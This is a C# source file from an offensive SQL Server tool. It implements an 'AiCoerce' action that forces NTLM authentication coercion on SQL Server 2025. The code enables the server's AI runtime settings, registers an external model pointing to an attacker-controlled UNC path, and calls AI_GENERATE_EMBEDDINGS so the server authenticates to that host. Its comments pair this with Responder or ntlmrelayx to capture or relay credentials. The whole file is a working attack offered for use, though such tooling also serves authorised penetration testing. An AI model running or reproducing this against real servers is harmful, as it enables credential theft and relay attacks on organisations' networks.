// MSSQLand/Actions/Remote/AiCoerce.cs

using System;

using MSSQLand.Services;
using MSSQLand.Utilities;

namespace MSSQLand.Actions.Remote
{
    /// <summary>
    /// Forces NTLM authentication to an attacker-controlled UNC path by registering a
    /// throwaway EXTERNAL MODEL that references a local ONNX runtime path, then invoking
    /// AI_GENERATE_EMBEDDINGS to trigger the file-system access.
    ///
    /// Prerequisites (all require sysadmin):
    ///   sp_configure 'external AI runtimes enabled' = 1
    ///   ALTER DATABASE SCOPED CONFIGURATION SET PREVIEW_FEATURES = ON
    ///
    /// The model is dropped after triggering unless --keep is passed (default: cleanup).
    /// Pair with Responder or ntlmrelayx on the UNC listener.
    /// </summary>
    internal class AiCoerce : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, ShortName = "u", LongName = "unc",
            Description = @"Attacker-controlled UNC path, e.g. \\192.168.1.10\share")]
        private string _uncPath = "";

        [ArgumentMetadata(Required = false, ShortName = "n", LongName = "name",
            Description = "Model name to register (auto-generated if omitted)")]
        private string _modelName = null;

        [ArgumentMetadata(Required = false, LongName = "keep",
            Description = "Keep the external model after triggering (default: drop it)")]
        private bool _keep = false;

        public override void ValidateArguments(string[] args)
        {
            BindArguments(args);

            if (string.IsNullOrWhiteSpace(_uncPath))
                throw new ArgumentException("UNC path is required.");

            string path = _uncPath.Trim();
            if (!path.StartsWith("\\\\"))
                path = "\\\\" + path.TrimStart('\\');

            _uncPath = path;

            if (string.IsNullOrWhiteSpace(_modelName))
                _modelName = "svc_emb_" + Guid.NewGuid().ToString("N").Substring(0, 8);
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            if (!AiModels.RequiresSql2025(databaseContext)) return false;

            Logger.Info($"Triggering NTLM authentication to: {_uncPath}");
            Logger.InfoNested($"Using model name: {_modelName}");

            if (!EnablePrerequisites(databaseContext))
                return false;

            if (!CreateExternalModel(databaseContext))
                return false;

            TriggerAuthentication(databaseContext);

            if (!_keep)
                DropModel(databaseContext);

            return true;
        }

        private bool EnablePrerequisites(DatabaseContext databaseContext)
        {
            if (!databaseContext.ConfigService.SetConfigurationOption("external AI runtimes enabled", 1))
            {
                Logger.Error("Failed to enable AI runtimes. Requires sysadmin.");
                return false;
            }

            try
            {
                // Enable PREVIEW_FEATURES for the current database, required for CREATE EXTERNAL MODEL
                databaseContext.QueryService.ExecuteNonProcessing(
                    "ALTER DATABASE SCOPED CONFIGURATION SET PREVIEW_FEATURES = ON;");
                Logger.Debug("PREVIEW_FEATURES enabled for current database");
            }
            catch (Exception ex)
            {
                Logger.Warning($"Could not enable PREVIEW_FEATURES: {ex.Message}");
                // Non-fatal; some builds may not require it
            }

            return true;
        }

        private bool CreateExternalModel(DatabaseContext databaseContext)
        {
            string uncEscaped   = _uncPath.Replace("'", "''");
            string modelEscaped = _modelName.Replace("'", "''");

            string ddl = $@"CREATE EXTERNAL MODEL [{modelEscaped}]
WITH (
    LOCATION           = '{uncEscaped}',
    API_FORMAT         = 'ONNX Runtime',
    MODEL_TYPE         = EMBEDDINGS,
    MODEL              = 'coerce',
    LOCAL_RUNTIME_PATH = '{uncEscaped}'
);";

            try
            {
                databaseContext.QueryService.ExecuteNonProcessing(ddl);
                Logger.Success($"External model '{_modelName}' created");
                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to create external model: {ex.Message}");
                return false;
            }
        }

        private void TriggerAuthentication(DatabaseContext databaseContext)
        {
            string modelEscaped = _modelName.Replace("'", "''");

            // Wrapping in TRY/CATCH because the UNC host won't serve a valid model;
            // the NTLM handshake is what we're after, not a successful embedding result.
            string query = $@"BEGIN TRY
    SELECT AI_GENERATE_EMBEDDINGS(N'probe' USE MODEL [{modelEscaped}]);
END TRY
BEGIN CATCH
    -- model unreachable; NTLM challenge already sent
END CATCH;
SELECT 1 AS Triggered;";

            try
            {
                databaseContext.QueryService.ExecuteTable(query);
                Logger.Success("Authentication attempt triggered, check your listener");
            }
            catch (Exception ex)
            {
                Logger.Warning($"Embedding call raised an exception (NTLM may still have been sent): {ex.Message}");
            }
        }

        private void DropModel(DatabaseContext databaseContext)
        {
            string modelEscaped = _modelName.Replace("'", "''");

            try
            {
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"DROP EXTERNAL MODEL IF EXISTS [{modelEscaped}];");
                Logger.Success($"External model '{_modelName}' removed");
            }
            catch (Exception ex)
            {
                Logger.Warning($"Cleanup failed, model '{_modelName}' may still exist: {ex.Message}");
            }
        }
    }
}
